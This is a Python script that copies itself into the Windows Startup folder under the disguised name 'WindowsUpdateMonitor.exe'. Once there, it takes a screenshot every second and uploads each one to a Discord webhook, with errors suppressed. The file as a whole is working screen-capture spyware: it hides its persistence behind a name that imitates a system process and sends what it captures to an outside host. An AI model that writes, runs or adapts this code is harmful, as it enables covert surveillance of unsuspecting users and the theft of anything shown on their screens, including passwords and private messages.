import os
import sys
import time
import requests
import io
import threading
import pyautogui as pag
import keyboard
from pathlib import Path
import shutil

# Configurations
pag.FAILSAFE = True
WEBHOOK_URL = "https://discord.com/api/webhooks/example"
PERSISTENCE_NAME = "WindowsUpdateMonitor.exe"

stop_flag = False

def stop_handler():
    global stop_flag
    stop_flag = True

def mouse_failsafe():
    global stop_flag
    while not stop_flag:
        if pag.position() == (0, 0):
            stop_flag = True
        time.sleep(0.1)

def setup_controls():
    keyboard.add_hotkey('ctrl+shift+q', stop_handler)
    keyboard.add_hotkey('f12', stop_handler)
    keyboard.add_hotkey('esc', stop_handler)
    threading.Thread(target=mouse_failsafe, daemon=True).start()

def ensure_startup():
    startup_folder = Path(os.getenv('APPDATA')) / r'Microsoft\Windows\Start Menu\Programs\Startup'
    startup_folder.mkdir(parents=True, exist_ok=True)
    
    current_path = Path(sys.executable) if getattr(sys, 'frozen', False) else Path(__file__).resolve()
    target_path = startup_folder / PERSISTENCE_NAME
    
    if not target_path.exists():
        shutil.copy2(current_path, target_path)

def send_screenshot(count):
    img = pag.screenshot()
    buf = io.BytesIO()
    img.save(buf, 'PNG', optimize=True)
    buf.seek(0)
    
    files = {'file': (f'shot_{count}.png', buf, 'image/png')}
    data = {'username': 'ScreenMonitor', 'content': f'#{count}'}
    
    try:
        requests.post(WEBHOOK_URL, data=data, files=files, timeout=5)
    except:
        pass  # Silent fail - don't break timing

def main():
    global stop_flag
    ensure_startup()
    setup_controls()
    
    count = 0
    next_time = time.time()
    
    print("Screenshot every 1s - Ctrl+Shift+Q to stop")
    
    while not stop_flag:
        send_screenshot(count)
        count += 1
        
        # PRECISE 1-SECOND INTERVAL - never drifts
        next_time += 1.0
        sleep_time = next_time - time.time()
        if sleep_time > 0:
            time.sleep(sleep_time)

if __name__ == "__main__":
    try:
        main()
    except:
        pass
